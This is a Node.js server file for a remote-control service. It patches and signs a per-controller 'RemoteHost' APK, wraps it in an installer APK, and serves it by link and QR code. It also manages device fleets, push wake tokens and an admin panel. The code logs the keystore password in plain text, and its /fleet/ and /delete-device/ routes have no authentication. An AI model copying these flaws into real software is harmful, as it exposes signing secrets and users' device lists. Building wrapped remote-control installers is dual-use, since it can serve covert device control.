const WebSocket = require('ws');
const http = require('http');
const admin = require('firebase-admin');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const { execFile } = require('child_process');
const AdmZip = require('adm-zip');
const QRCode = require('qrcode');
const { Redis } = require('@upstash/redis');

// ═══════════════════════════════════════════════════════════════════════
//  APK BUILDER  —  per-controller signed APK generation
// ═══════════════════════════════════════════════════════════════════════
const TEMPLATE_APK           = path.join(__dirname, 'template.apk');            // inner RemoteHost APK
const TEMPLATE_INSTALLER_APK = path.join(__dirname, 'template-installer.apk'); // installer wrapper APK
const APK_SIGNER_JAR         = path.join(__dirname, 'uber-apk-signer.jar');
const BUILD_DIR = path.join(os.tmpdir(), 'apk-builds');
const PLACEHOLDER_KEY = 'CMD-00000000';
const PLACEHOLDER_URL = 'wss://placeholder.invalid';
const KEY_ALIAS = process.env.KEY_ALIAS || 'remotelink';

// Public URL of this server — Render sets RENDER_EXTERNAL_URL automatically.
// It updates itself if the service URL ever changes, so we never have to
// rebuild the template APK just because the URL moved.
const SERVER_PUBLIC_URL = process.env.RENDER_EXTERNAL_URL ||
                          `http://localhost:${process.env.PORT || 3000}`;
const SERVER_WS_URL = SERVER_PUBLIC_URL.replace(/^http/, 'ws');
console.log('🌐 Server public URL:', SERVER_PUBLIC_URL);
console.log('🌐 Server WS URL:    ', SERVER_WS_URL);

// Cache: masterId -> { path, size, builtAt }
const apkCache = new Map();
const CACHE_TTL_MS = 30 * 60 * 1000;   // 30 min — /tmp is ephemeral anyway

// ── Build queue ─────────────────────────────────────────────────────
// A promise-chain acts as a FIFO queue: each new build appends itself
// to the tail and runs when the previous one settles. This serializes
// builds so two concurrent requests never OOM the 512 MB instance —
// instead, user #2 just waits a few seconds longer.
let buildQueueTail = Promise.resolve();
let buildQueueDepth = 0;

function enqueueBuild(fn) {
  buildQueueDepth++;
  console.log(`📥 Build queued (depth=${buildQueueDepth})`);
  const run = async () => {
    try { return await fn(); }
    finally {
      buildQueueDepth--;
      console.log(`📤 Build finished (remaining in queue=${buildQueueDepth})`);
    }
  };
  const next = buildQueueTail.then(run, run);
  // Never let a rejection poison the chain for later waiters
  buildQueueTail = next.catch(() => {});
  return next;
}

// Keystore lives in env var (base64) — decoded to /tmp at booty
let KEYSTORE_PATH = null;
(function initKeystore() {
  try {
    const b64 = process.env.KEYSTORE_B64;
    if (!b64) {
      console.log('⚠  KEYSTORE_B64 not set — APK build endpoint will refuse to sign');
      return;
    }
    const buf = Buffer.from(b64.trim(), 'base64');
    const p = path.join(os.tmpdir(), 'release.jks');
    fs.writeFileSync(p, buf);
    KEYSTORE_PATH = p;
    console.log('🔐 Keystore decoded:', buf.length, 'bytes →', p);
  } catch (e) {
    console.log('❌ Keystore decode failed:', e.message);
  }
})();

// Ensure build dir exists
try { fs.mkdirSync(BUILD_DIR, { recursive: true }); } catch (_) {}

// Validate masterId strictly — must look like CMD-XXXXXXXX
function isValidMasterId(id) {
  return typeof id === 'string' && /^CMD-[A-Z0-9]{8}$/.test(id);
}

// ── 1. Patch the placeholder key inside the template APK ──────────────
// Uses adm-zip so we modify ONLY the one entry, leaving every other zip
// record (extra fields, alignment, compression method) exactly as
// Android Studio produced them. This is critical — Android's PackageParser
// rejects zips whose structure has been rebuilt by a generic zipper.
function patchApk(templatePath, outPath, masterId) {
  return new Promise((resolve, reject) => {
    try {
      const zip = new AdmZip(templatePath);
      const entry = zip.getEntry('assets/master_config.json');
      if (!entry) {
        return reject(new Error('assets/master_config.json not found in template APK'));
      }

      const original = zip.readAsText(entry);
      if (!original.includes(PLACEHOLDER_KEY)) {
        return reject(new Error(
          `Template does not contain placeholder ${PLACEHOLDER_KEY}. ` +
          `Found: ${original.slice(0, 200)}`
        ));
      }

      const patched = original
        .replace(PLACEHOLDER_KEY, masterId)
        .replace(PLACEHOLDER_URL, SERVER_WS_URL);
      zip.updateFile(entry, Buffer.from(patched, 'utf8'));

      // writeZip preserves every other entry's original metadata
      zip.writeZip(outPath);

      const size = require('fs').statSync(outPath).size;
      console.log(`🩹 patched APK written: ${(size / 1024 / 1024).toFixed(1)} MB`);
      resolve();
    } catch (e) {
      reject(e);
    }
  });
}

// ── 2. Sign the patched APK with uber-apk-signer ─────────────────────
function signApk(inputApk, outDir) {
  return new Promise((resolve, reject) => {
    if (!KEYSTORE_PATH) return reject(new Error('Keystore not available'));
    const ksPass = process.env.KEYSTORE_PASSWORD;
    if (!ksPass) return reject(new Error('KEYSTORE_PASSWORD env missing'));
    const keyPass = process.env.KEY_PASSWORD || ksPass;

    // uber-apk-signer v1.3.0 — minimal, only flags we know exist.
    // `--debug` gives us useful diagnostics if it fails.
    const args = [
      '-Xmx256m',
      '-jar', APK_SIGNER_JAR,
      '--apks', inputApk,
      '--ks', KEYSTORE_PATH,
      '--ksAlias', KEY_ALIAS,
      '--ksPass', ksPass,
      '--ksKeyPass', keyPass,
      '--out', outDir,
      '--debug',
    ];

    console.log('🔧 running: java', args.join(' '));

    execFile('java', args, { timeout: 120000, maxBuffer: 16 * 1024 * 1024 }, (err, stdout, stderr) => {
      const out = (stdout || '').trim();
      const er  = (stderr || '').trim();

      // Log EVERYTHING so we can see what the signer actually said.
      console.log('📜 apk-signer stdout:\n' + out.slice(0, 4000));
      if (er) console.log('📜 apk-signer stderr:\n' + er.slice(0, 4000));

      if (err) {
        return reject(new Error(
          `apk-signer exited with code ${err.code}. ` +
          `stdout tail: ${out.slice(-600)} | stderr tail: ${er.slice(-600)}`
        ));
      }
      resolve({ stdout: out, stderr: er });
    });
  });
}

// ── 2b. Replace the inner APK inside the installer wrapper ───────────
// Auto-detects the inner APK slot inside assets/ so it survives renames.
function wrapInstaller(installerPath, innerApkPath, outPath) {
  return new Promise((resolve, reject) => {
    try {
      if (!fs.existsSync(installerPath)) {
        return reject(new Error(`Installer template missing: ${installerPath}`));
      }

      const zip = new AdmZip(installerPath);
      const allEntries = zip.getEntries();

      // Find any .apk file inside assets/ (case-insensitive)
      const innerEntry = allEntries.find(e => {
        const n = e.entryName.toLowerCase();
        return n.startsWith('assets/') && n.endsWith('.apk');
      });

      if (!innerEntry) {
        const assetEntries = allEntries
          .map(e => e.entryName)
          .filter(n => n.startsWith('assets/'))
          .slice(0, 30);
        return reject(new Error(
          `No APK found inside installer's assets/ folder. ` +
          `Expected assets/<something>.apk. Found: ${assetEntries.join(', ') || '(empty)'}`
        ));
      }

      console.log(`🔍 installer inner slot: ${innerEntry.entryName}`);
      const innerBytes = fs.readFileSync(innerApkPath);
      zip.updateFile(innerEntry, innerBytes);
      zip.writeZip(outPath);

      const sz = fs.statSync(outPath).size;
      console.log(`🎁 installer wrapped → ${(sz / 1024 / 1024).toFixed(1)} MB  (inner ${(innerBytes.length / 1024 / 1024).toFixed(1)} MB)`);
      resolve();
    } catch (e) {
      reject(e);
    }
  });
}

// Helper — find the freshly signed APK in an output directory
function findSignedApk(dir) {
  let entries = [];
  try { entries = fs.readdirSync(dir); } catch (_) {}
  const signed = entries.find(f => f.endsWith('-signed.apk'));
  if (signed) return path.join(dir, signed);
  const anyApk = entries.find(f => f.endsWith('.apk'));
  return anyApk ? path.join(dir, anyApk) : null;
}

// ── 3. Full build pipeline (patch → sign → cache) ────────────────────
async function buildApkForMaster(masterId) {
  // Fast path — cached and still fresh
  const cached = apkCache.get(masterId);
  if (cached && (Date.now() - cached.builtAt) < CACHE_TTL_MS && fs.existsSync(cached.path)) {
    console.log(`⚡ Cache hit for ${masterId}`);
    return cached;
  }

  // Slow path — queue it so concurrent requests don't OOM the instance
  return enqueueBuild(() => actuallyBuild(masterId));
}

async function actuallyBuild(masterId) {
  // Re-check cache — another request may have just built it while we waited
  const cached = apkCache.get(masterId);
  if (cached && (Date.now() - cached.builtAt) < CACHE_TTL_MS && fs.existsSync(cached.path)) {
    console.log(`⚡ Cache hit after queue wait for ${masterId}`);
    return cached;
  }

  const buildId = crypto.randomBytes(6).toString('hex');
  const workDir = path.join(BUILD_DIR, buildId);
  fs.mkdirSync(workDir, { recursive: true });

  const patchedInner     = path.join(workDir, 'patched-inner.apk');
  const innerSignDir     = path.join(workDir, 'inner-signed');
  const wrappedInstaller = path.join(workDir, 'wrapped-installer.apk');
  const finalSignDir     = path.join(workDir, 'final-signed');
  fs.mkdirSync(innerSignDir, { recursive: true });
  fs.mkdirSync(finalSignDir, { recursive: true });

  try {
    // ── Stage 1: patch + sign the inner RemoteHost APK ─────────────
    console.log(`🔧 [${masterId}] stage 1/2 — patching inner APK`);
    await patchApk(TEMPLATE_APK, patchedInner, masterId);

    console.log(`🔧 [${masterId}] stage 1/2 — signing inner APK`);
    await signApk(patchedInner, innerSignDir);
    const signedInner = findSignedApk(innerSignDir);
    if (!signedInner) throw new Error('stage 1: signer produced no inner APK');
    const innerSize = fs.statSync(signedInner).size;
    console.log(`✅ [${masterId}] inner signed: ${(innerSize / 1024 / 1024).toFixed(1)} MB`);

    // ── Stage 2: wrap the installer + sign it ──────────────────────
    console.log(`🔧 [${masterId}] stage 2/2 — wrapping installer`);
    await wrapInstaller(TEMPLATE_INSTALLER_APK, signedInner, wrappedInstaller);

    console.log(`🔧 [${masterId}] stage 2/2 — signing installer`);
    await signApk(wrappedInstaller, finalSignDir);
    const finalApk = findSignedApk(finalSignDir);
    if (!finalApk) throw new Error('stage 2: signer produced no final APK');

    const size = fs.statSync(finalApk).size;
    console.log(`✅ [${masterId}] FINAL installer: ${(size / 1024 / 1024).toFixed(1)} MB`);

    const rec = { path: finalApk, size, builtAt: Date.now() };
    apkCache.set(masterId, rec);
    return rec;
  } catch (e) {
    // Clean up intermediate files on failure
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch (_) {}
    throw e;
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  PERSISTENCE — Upstash Redis (survives redeploys, free forever)
// ═══════════════════════════════════════════════════════════════════════
const redis = (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN)
  ? new Redis({
      url: process.env.UPSTASH_REDIS_REST_URL,
      token: process.env.UPSTASH_REDIS_REST_TOKEN,
    })
  : null;

if (redis) {
  console.log('🗄  Upstash Redis configured — persistence enabled');
} else {
  console.log('⚠  Upstash Redis NOT configured — using in-memory only (data lost on restart)');
}

// In-memory mirrors — fast reads, synced from Redis at boot
let fcmTokens = {};
let fleetDevices = {};
let lastSeen = {};

// Load everything from Redis at startup
async function hydrateFromRedis() {
  if (!redis) return;
  try {
    const [ft, fd, ls] = await Promise.all([
      redis.get('fcmTokens'),
      redis.get('fleetDevices'),
      redis.get('lastSeen'),
    ]);
    // Upstash auto-parses JSON when it detects it, so these may already be objects
    fcmTokens = (typeof ft === 'string' ? JSON.parse(ft) : ft) || {};
    fleetDevices = (typeof fd === 'string' ? JSON.parse(fd) : fd) || {};
    lastSeen = (typeof ls === 'string' ? JSON.parse(ls) : ls) || {};
    console.log(`🗄  Hydrated: ${Object.keys(fcmTokens).length} FCM tokens, ${Object.keys(fleetDevices).length} fleets, ${Object.keys(lastSeen).length} seen records`);
  } catch (e) {
    console.log('❌ Redis hydrate failed:', e.message);
  }
}

// Debounced write batching — avoids hammering Redis during bursts
const pendingWrites = new Set();
let writeTimer = null;

function scheduleWrite(key) {
  pendingWrites.add(key);
  if (writeTimer) return;
  writeTimer = setTimeout(flushWrites, 800);
}

async function flushWrites() {
  writeTimer = null;
  if (!redis || pendingWrites.size === 0) return;
  const keys = Array.from(pendingWrites);
  pendingWrites.clear();
  try {
    const ops = keys.map(k => {
      const val = { fcmTokens, fleetDevices, lastSeen }[k];
      return redis.set(k, JSON.stringify(val));
    });
    await Promise.all(ops);
  } catch (e) {
    console.log('❌ Redis write failed:', e.message);
    // Re-queue so the next flush retries
    keys.forEach(k => pendingWrites.add(k));
  }
}

function saveTokens()  { scheduleWrite('fcmTokens'); }
function saveFleet()   { scheduleWrite('fleetDevices'); }
function saveSeen()    { scheduleWrite('lastSeen'); }

// Fire-and-forget hydrate — server can start listening immediately
hydrateFromRedis();

// ═══════════════════════════════════════════════════════════════════════
//  ACTIVITY LOG — ring buffer (last 500 events, in memory only)
// ═══════════════════════════════════════════════════════════════════════
const activityLog = [];
const MAX_LOG = 500;

function logEvent(type, data = {}) {
  activityLog.push({ t: Date.now(), type, ...data });
  if (activityLog.length > MAX_LOG) {
    activityLog.splice(0, activityLog.length - MAX_LOG);
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  ADMIN AUTH — password + in-memory tokens
// ═══════════════════════════════════════════════════════════════════════
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '';
const ADMIN_TOKEN_TTL_MS = 8 * 60 * 60 * 1000;  // 8 hours
const adminSessions = new Map();                 // token -> { createdAt, ip }
const loginAttempts = new Map();                 // ip -> { count, resetAt }

if (ADMIN_PASSWORD) {
  console.log('🔐 Admin panel enabled (password set)');
} else {
  console.log('⚠  ADMIN_PASSWORD not set — /admin will be disabled');
}

function safeEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  if (a.length !== b.length) return false;
  let r = 0;
  for (let i = 0; i < a.length; i++) r |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return r === 0;
}

function clientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return String(fwd).split(',')[0].trim();
  return req.socket?.remoteAddress || 'unknown';
}

function checkRateLimit(ip) {
  const now = Date.now();
  const rec = loginAttempts.get(ip);
  if (!rec || now > rec.resetAt) {
    loginAttempts.set(ip, { count: 1, resetAt: now + 15 * 60 * 1000 });
    return true;
  }
  if (rec.count >= 10) return false;
  rec.count++;
  return true;
}

function issueToken(ip) {
  const token = crypto.randomBytes(32).toString('hex');
  adminSessions.set(token, { createdAt: Date.now(), ip });
  return token;
}

function validateToken(req) {
  const hdr = req.headers['authorization'] || '';
  const m = /^Bearer\s+(.+)$/.exec(hdr);
  if (!m) return null;
  const token = m[1];
  const rec = adminSessions.get(token);
  if (!rec) return null;
  if (Date.now() - rec.createdAt > ADMIN_TOKEN_TTL_MS) {
    adminSessions.delete(token);
    return null;
  }
  return token;
}

// Sweep expired tokens every hour
setInterval(() => {
  const now = Date.now();
  for (const [t, rec] of adminSessions) {
    if (now - rec.createdAt > ADMIN_TOKEN_TTL_MS) adminSessions.delete(t);
  }
  for (const [ip, rec] of loginAttempts) {
    if (now > rec.resetAt) loginAttempts.delete(ip);
  }
}, 60 * 60 * 1000);

function requireAdmin(req, res) {
  if (!ADMIN_PASSWORD) {
    res.writeHead(503, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'Admin not configured' }));
    return null;
  }
  const token = validateToken(req);
  if (!token) {
    res.writeHead(401, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'Unauthorized' }));
    return null;
  }
  return token;
}

function readJsonBody(req) {
  return new Promise((resolve, reject) => {
    let buf = '';
    req.on('data', c => { buf += c; if (buf.length > 64 * 1024) { reject(new Error('Body too large')); req.destroy(); } });
    req.on('end', () => {
      if (!buf) return resolve({});
      try { resolve(JSON.parse(buf)); } catch (e) { reject(e); }
    });
    req.on('error', reject);
  });
}

// init firebase admin!!
try {
  const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT || '{}');
  admin.initializeApp({
    credential: admin.credential.cert(serviceAccount)
  });
  console.log('Firebase Admin initialized!!');
} catch(e) {
  console.log('Firebase Admin init failed:', e.message);
}
const server = http.createServer((req, res) => {
  // Allow Electron to fetch this without CORS errors
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    return res.end();
  }

  // ══════════════════════════════════════════════════════════════════════
  //  ADMIN PANEL — served HTML + JSON API
  // ══════════════════════════════════════════════════════════════════════

  // Prevent Google/search engines from indexing the admin
  res.setHeader('X-Robots-Tag', 'noindex, nofollow');

  // ── Serve admin.html ──────────────────────────────────────────────
  if (req.method === 'GET' && (req.url === '/admin' || req.url === '/admin/' || req.url.startsWith('/admin?'))) {
    try {
      const html = fs.readFileSync(path.join(__dirname, 'admin.html'), 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
      return res.end(html);
    } catch (e) {
      res.writeHead(500);
      return res.end('admin.html not found on server');
    }
  }

  // ── Serve admin-remote.html ───────────────────────────────────────
  if (req.method === 'GET' && (req.url === '/admin-remote' || req.url.startsWith('/admin-remote?'))) {
    try {
      const html = fs.readFileSync(path.join(__dirname, 'admin-remote.html'), 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
      return res.end(html);
    } catch (e) {
      res.writeHead(500);
      return res.end('admin-remote.html not found on server');
    }
  }

  // ── POST /admin-api/login ─────────────────────────────────────────
  if (req.method === 'POST' && req.url === '/admin-api/login') {
    if (!ADMIN_PASSWORD) { res.writeHead(503); return res.end(JSON.stringify({ error: 'Admin not configured' })); }
    const ip = clientIp(req);
    if (!checkRateLimit(ip)) {
      logEvent('admin_login_ratelimited', { ip });
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many attempts. Try again in 15 minutes.' }));
    }
    readJsonBody(req).then(body => {
      if (!safeEqual(String(body.password || ''), ADMIN_PASSWORD)) {
        logEvent('admin_login_failed', { ip });
        res.writeHead(401, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Invalid password' }));
      }
      const token = issueToken(ip);
      logEvent('admin_login_ok', { ip });
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ token, expiresIn: ADMIN_TOKEN_TTL_MS }));
    }).catch(() => { res.writeHead(400); res.end(JSON.stringify({ error: 'Bad request' })); });
    return;
  }

  // ── POST /admin-api/logout ────────────────────────────────────────
  if (req.method === 'POST' && req.url === '/admin-api/logout') {
    const token = validateToken(req);
    if (token) adminSessions.delete(token);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true }));
  }

  // ── GET /admin-api/stats ──────────────────────────────────────────
  if (req.method === 'GET' && req.url === '/admin-api/stats') {
    if (!requireAdmin(req, res)) return;
    const now = Date.now();
    const fleets = Object.keys(fleetDevices);
    const totalDevices = fleets.reduce((s, k) => s + (fleetDevices[k]?.length || 0), 0);
    let onlineNow = 0, activeSessions = 0;
    for (const room of Object.values(rooms)) {
      if (room.host?.readyState === 1) onlineNow++;
      if (room.host?.readyState === 1 && room.controller?.readyState === 1) activeSessions++;
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      fleets: fleets.length,
      devices: totalDevices,
      onlineNow,
      activeSessions,
      fcmTokens: Object.keys(fcmTokens).length,
      buildQueueDepth,
      apkCacheSize: apkCache.size,
      redisConfigured: !!redis,
      uptimeMs: process.uptime() * 1000,
      now,
    }));
  }

  // ── GET /admin-api/fleets ─────────────────────────────────────────
  if (req.method === 'GET' && req.url === '/admin-api/fleets') {
    if (!requireAdmin(req, res)) return;
    const out = [];
    for (const key of Object.keys(fleetDevices)) {
      const devices = fleetDevices[key] || [];
      let online = 0;
      let lastSeenAt = 0;
      for (const d of devices) {
        if (rooms[d.id]?.host?.readyState === 1) online++;
        const s = lastSeen[d.id];
        if (s && s > lastSeenAt) lastSeenAt = s;
      }
      out.push({
        id: key,
        deviceCount: devices.length,
        onlineCount: online,
        lastSeenAt: lastSeenAt || null,
        devices: devices.map(d => ({ id: d.id, name: d.name, addedAt: d.addedAt || null })),
      });
    }
    out.sort((a, b) => (b.lastSeenAt || 0) - (a.lastSeenAt || 0));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(out));
  }

  // ── GET /admin-api/devices ────────────────────────────────────────
  if (req.method === 'GET' && req.url === '/admin-api/devices') {
    if (!requireAdmin(req, res)) return;
    const out = [];
    for (const key of Object.keys(fleetDevices)) {
      for (const d of (fleetDevices[key] || [])) {
        const room = rooms[d.id];
        const online = room?.host?.readyState === 1;
        const busy = online && room?.controller?.readyState === 1;
        out.push({
          id: d.id,
          name: d.name,
          fleet: key,
          addedAt: d.addedAt || null,
          lastSeen: lastSeen[d.id] || null,
          hasFcm: !!fcmTokens[d.id],
          state: busy ? 'busy' : (online ? 'online' : (fcmTokens[d.id] ? 'standby' : 'offline')),
        });
      }
    }
    out.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(out));
  }

  // ── GET /admin-api/sessions ───────────────────────────────────────
  if (req.method === 'GET' && req.url === '/admin-api/sessions') {
    if (!requireAdmin(req, res)) return;
    const out = [];
    for (const [roomId, room] of Object.entries(rooms)) {
      const hostOnline = room.host?.readyState === 1;
      const ctrlOnline = room.controller?.readyState === 1;
      if (!hostOnline && !ctrlOnline) continue;
      out.push({
        roomId,
        hostOnline,
        controllerOnline: ctrlOnline,
        hostJoinedAt: room.hostJoinedAt || null,
        controllerJoinedAt: room.controllerJoinedAt || null,
        mode: room.mode || null,
        hostReady: !!room.hostReady,
      });
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(out));
  }

  // ── GET /admin-api/logs ───────────────────────────────────────────
  if (req.method === 'GET' && req.url === '/admin-api/logs') {
    if (!requireAdmin(req, res)) return;
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(activityLog.slice().reverse()));
  }

  // ── DELETE /admin-api/devices/:id ─────────────────────────────────
  if (req.method === 'DELETE' && req.url.startsWith('/admin-api/devices/')) {
    if (!requireAdmin(req, res)) return;
    const deviceId = decodeURIComponent(req.url.split('/')[3] || '');
    let removed = false;
    for (const key of Object.keys(fleetDevices)) {
      const before = fleetDevices[key].length;
      fleetDevices[key] = fleetDevices[key].filter(d => d.id !== deviceId);
      if (fleetDevices[key].length !== before) removed = true;
    }
    delete fcmTokens[deviceId];
    delete lastSeen[deviceId];
    saveFleet(); saveTokens(); saveSeen();
    logEvent('admin_device_deleted', { deviceId, removed });
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true, removed }));
  }

  // ── DELETE /admin-api/fleets/:id ──────────────────────────────────
  if (req.method === 'DELETE' && req.url.startsWith('/admin-api/fleets/')) {
    if (!requireAdmin(req, res)) return;
    const fleetId = decodeURIComponent(req.url.split('/')[3] || '');
    const devices = fleetDevices[fleetId] || [];
    delete fleetDevices[fleetId];
    for (const d of devices) {
      delete fcmTokens[d.id];
      delete lastSeen[d.id];
    }
    saveFleet(); saveTokens(); saveSeen();
    logEvent('admin_fleet_wiped', { fleetId, deviceCount: devices.length });
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true, devicesRemoved: devices.length }));
  }

  // ── POST /admin-api/sessions/:roomId/kill ─────────────────────────
  if (req.method === 'POST' && req.url.startsWith('/admin-api/sessions/') && req.url.endsWith('/kill')) {
    if (!requireAdmin(req, res)) return;
    const parts = req.url.split('/');
    const roomId = decodeURIComponent(parts[3] || '');
    const room = rooms[roomId];
    if (!room) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Room not found' }));
    }
    try { room.host?.send(JSON.stringify({ type: 'peer-left' })); } catch (_) {}
    try { room.controller?.send(JSON.stringify({ type: 'peer-left' })); } catch (_) {}
    try { room.host?.close(); } catch (_) {}
    try { room.controller?.close(); } catch (_) {}
    delete rooms[roomId];
    logEvent('admin_session_killed', { roomId });
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ ok: true }));
  }

  // ============================================================
  // EDIT 2: HTTP route for /status
  // ============================================================
  if (req.method === 'GET' && req.url.startsWith('/status')) {
    const u = new URL(req.url, 'http://localhost');
    const ids = (u.searchParams.get('ids') || '')
      .split(',')
      .map(s => s.trim())
      .filter(s => /^[A-Za-z0-9-]{4,32}$/.test(s))
      .slice(0, 100);
    const out = {};
    ids.forEach(id => { out[id] = getDeviceStatus(id); });
    res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' });
    return res.end(JSON.stringify(out));
  }

  // ══════════════════════════════════════════════════════════════════════
  //  GET /apk/:masterId      → signed APK built for that master
  //  GET /apk-qr/:masterId   → SVG QR code pointing at the APK URL
  // ══════════════════════════════════════════════════════════════════════

  if (req.method === 'GET' && req.url.startsWith('/apk-qr/')) {
    const masterId = (req.url.split('/')[2] || '').trim().toUpperCase();
    if (!isValidMasterId(masterId)) {
      res.writeHead(400); return res.end('Invalid masterId');
    }
    const apkUrl = `${SERVER_PUBLIC_URL}/apk/${masterId}`;
    QRCode.toString(apkUrl, { type: 'svg', margin: 1, width: 320 }, (err, svg) => {
      if (err) { res.writeHead(500); return res.end('QR generation failed'); }
      res.writeHead(200, { 'Content-Type': 'image/svg+xml', 'Cache-Control': 'public, max-age=300' });
      res.end(svg);
    });
    return;
  }

  if (req.method === 'GET' && req.url.startsWith('/apk/')) {
    // Strip optional .apk suffix and any query string
    const raw = req.url.split('?')[0];
    let masterId = (raw.split('/')[2] || '').trim().toUpperCase();
    if (masterId.endsWith('.APK')) masterId = masterId.slice(0, -4);

    if (!isValidMasterId(masterId)) {
      res.writeHead(400); return res.end('Invalid masterId');
    }
    if (!KEYSTORE_PATH) {
      res.writeHead(503); return res.end('APK builder not configured on server');
    }

    console.log(`📦 APK build requested for ${masterId}`);
    const t0 = Date.now();

    buildApkForMaster(masterId)
      .then((rec) => {
        const ms = Date.now() - t0;
        console.log(`✅ Built ${masterId} in ${ms}ms — ${(rec.size / 1024 / 1024).toFixed(1)} MB`);

        const stat = fs.statSync(rec.path);
        const totalSize = stat.size;
        const rangeHeader = req.headers.range;

        // ── Range request support ──────────────────────────────────
        // Render's free-tier proxy kills responses at ~100s. Range
        // requests let the client download in chunks — if a chunk dies,
        // it resumes from where it stopped instead of losing everything.
        if (rangeHeader) {
          const m = /^bytes=(\d+)-(\d*)$/.exec(rangeHeader.trim());
          if (!m) {
            res.writeHead(416, { 'Content-Range': `bytes */${totalSize}` });
            return res.end();
          }
          const start = parseInt(m[1], 10);
          const end = m[2] ? Math.min(parseInt(m[2], 10), totalSize - 1) : totalSize - 1;

          if (start >= totalSize || start > end) {
            res.writeHead(416, {
              'Content-Range': `bytes */${totalSize}`,
              'Access-Control-Allow-Origin': '*',
            });
            return res.end();
          }

          console.log(`↪ Range: bytes ${start}-${end}/${totalSize}`);
          res.writeHead(206, {
            'Content-Type': 'application/octet-stream',
            'Content-Length': end - start + 1,
            'Content-Range': `bytes ${start}-${end}/${totalSize}`,
            'Accept-Ranges': 'bytes',
            'Cache-Control': 'no-store',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Expose-Headers': 'Content-Length, Content-Range, Accept-Ranges',
          });
          fs.createReadStream(rec.path, { start, end }).pipe(res);
          return;
        }

        // ── Full download ─────────────────────────────────────────
                res.writeHead(200, {
          'Content-Type': 'application/vnd.android.package-archive',
          'Content-Length': rec.size,
          'Content-Disposition': `attachment; filename="RemoteLink-${masterId}.apk"`,
          'Cache-Control': 'no-store',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Expose-Headers': 'Content-Length, Content-Disposition',
        });
        fs.createReadStream(rec.path).pipe(res);
      })
      .catch((err) => {
        console.error(`❌ APK build failed for ${masterId}:`, err.message);
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('APK build failed: ' + err.message);
      });
    return;
  }

  // The Controller asks for its devices
  if (req.url.startsWith('/fleet/')) {
    const masterId = req.url.split('/')[2];
    const devices = fleetDevices[masterId] || [];
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(devices));
  }
  // Handle permanent deletion!!
  if (req.method === 'DELETE' && req.url.startsWith('/delete-device/')) {
    // Format: /delete-device/MASTER_ID/DEVICE_ID
    const parts = req.url.split('/');
    const masterId = parts[2];
    const deviceId = parts[3];
    if (fleetDevices[masterId]) {
      fleetDevices[masterId] = fleetDevices[masterId].filter(d => d.id !== deviceId);
      saveFleet();
      console.log(`🗑 Permanently deleted device ${deviceId} from fleet ${masterId}`);
      logEvent('device_deleted_by_user', { deviceId, fleetId: masterId });
      
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: true }));
    } else {
      res.writeHead(404);
      return res.end('Fleet not found');
    }
  }
  res.writeHead(200);
  res.end('Remote Control Server Running!!');
});
const wss = new WebSocket.Server({ server, maxPayload: 10 * 1024 * 1024 });
const rooms = {};
// ============================================================
// EDIT 1: Device Status Management
// ============================================================
// lastSeen is declared above in the persistence block
function touchSeen(deviceId) {
  lastSeen[deviceId] = Date.now();
  saveSeen();
}

// Periodic flush — catches anything the debounced writer missed
setInterval(() => {
  if (pendingWrites.size > 0) flushWrites();
}, 60000);
// online   = host socket connected, nobody controlling it
// busy     = host connected AND a controller is already connected
// standby  = host not connected, but we have an FCM token (we can try to wake it)
// offline  = host not connected and no way to wake it
function getDeviceStatus(id) {
  const room = rooms[id];
  const hostOnline = !!(room && room.host && room.hostReady &&
                        room.host.readyState === WebSocket.OPEN);
  const controllerOn = !!(room && room.controller &&
                          room.controller.readyState === WebSocket.OPEN);
  let state;
  if (hostOnline) state = controllerOn ? 'busy' : 'online';
  else state = fcmTokens[id] ? 'standby' : 'offline';
  const seen = hostOnline ? Date.now() : (lastSeen[id] || null);
  return { state, lastSeenAgoMs: seen ? Date.now() - seen : null };
}
// handle crashes!!
process.on('uncaughtException', (err) => {
  console.log('Uncaught exception:', err.message);
});
process.on('unhandledRejection', (err) => {
  console.log('Unhandled rejection:', err);
});
